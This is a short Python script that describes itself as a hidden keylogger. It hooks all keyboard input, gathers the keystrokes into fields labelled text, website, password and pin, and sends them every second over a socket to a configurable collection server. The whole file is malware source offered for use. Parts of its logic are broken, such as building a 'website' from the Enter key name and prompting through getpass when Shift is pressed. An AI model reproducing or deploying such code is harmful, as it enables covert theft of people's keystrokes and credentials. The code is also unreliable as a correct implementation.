import socket
import json
import keyboard
import threading
import time
import os
import getpass
from datetime import datetime

# Module Name
module_name = "test1"  # Change this to your desired name

# Server Configuration
HOST = '127.0.0.1'
PORT = 5000

# Create a hidden keylogger
def send_data(data):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    client.send(json.dumps(data).encode())
    client.close()

# Keylogger Function
def keylogger():
    data = {
        "module": module_name,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "keys": "",
        "website": "",
        "text": "",
        "password": "",
        "pin": ""
    }

    def on_press(event):
        data["keys"] += event.name
        data["text"] += event.name
        if event.name == "enter":
            data["website"] = "https://www." + event.name
        if event.name == "backspace":
            data["text"] = data["text"][:-1]
        if event.name == "space":
            data["text"] += " "
        if event.name == "shift":
            data["password"] = getpass.getpass()
            data["pin"] = getpass.getpass()

    keyboard.hook(on_press)

    while True:
        time.sleep(1)
        send_data(data)

# Run Keylogger
threading.Thread(target=keylogger).start()
